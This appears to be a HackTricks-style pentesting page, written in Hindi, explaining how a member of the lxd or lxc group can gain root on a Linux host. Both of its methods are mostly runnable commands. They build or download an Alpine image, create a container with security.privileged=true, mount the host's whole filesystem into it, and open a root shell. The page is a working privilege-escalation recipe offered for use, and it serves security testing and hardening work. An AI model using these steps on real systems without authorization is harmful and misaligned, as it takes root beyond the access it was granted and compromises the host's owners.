# lxd/lxc समूह - विशेषाधिकार वृद्धि

{{#include ../../../banners/hacktricks-training.md}}

यदि आप _**lxd**_ **या** _**lxc**_ **समूह** के सदस्य हैं, तो आप रूट बन सकते हैं।

## इंटरनेट के बिना शोषण

### विधि 1

आप एक विश्वसनीय रिपॉजिटरी से lxd के साथ उपयोग करने के लिए एक alpine इमेज डाउनलोड कर सकते हैं। 
Canonical अपने साइट पर दैनिक निर्माण प्रकाशित करता है: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
बस नवीनतम निर्माण से **lxd.tar.xz** और **rootfs.squashfs** दोनों को प्राप्त करें। (डायरेक्टरी का नाम तारीख है)।

वैकल्पिक रूप से, आप अपने मशीन में इस डिस्ट्रो बिल्डर को स्थापित कर सकते हैं: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (गिटहब के निर्देशों का पालन करें):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
फाइलें **incus.tar.xz** (**lxd.tar.xz** यदि आपने Canonical रिपॉजिटरी से डाउनलोड की है) और **rootfs.squashfs** अपलोड करें, इमेज को रिपॉजिटरी में जोड़ें और एक कंटेनर बनाएं:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> यदि आप यह त्रुटि _**त्रुटि: कोई स्टोरेज पूल नहीं मिला। कृपया एक नया स्टोरेज पूल बनाएं**_\
> चलाएँ **`lxd init`** और सभी विकल्पों को डिफ़ॉल्ट पर सेट करें। फिर **पिछले** आदेशों के समूह को **दोहराएँ** 

अंत में आप कंटेनर को निष्पादित कर सकते हैं और रूट प्राप्त कर सकते हैं:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Method 2

एक Alpine इमेज बनाएं और इसे `security.privileged=true` फ्लैग का उपयोग करके शुरू करें, जिससे कंटेनर को होस्ट फाइल सिस्टम के साथ रूट के रूप में इंटरैक्ट करने के लिए मजबूर किया जा सके।
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
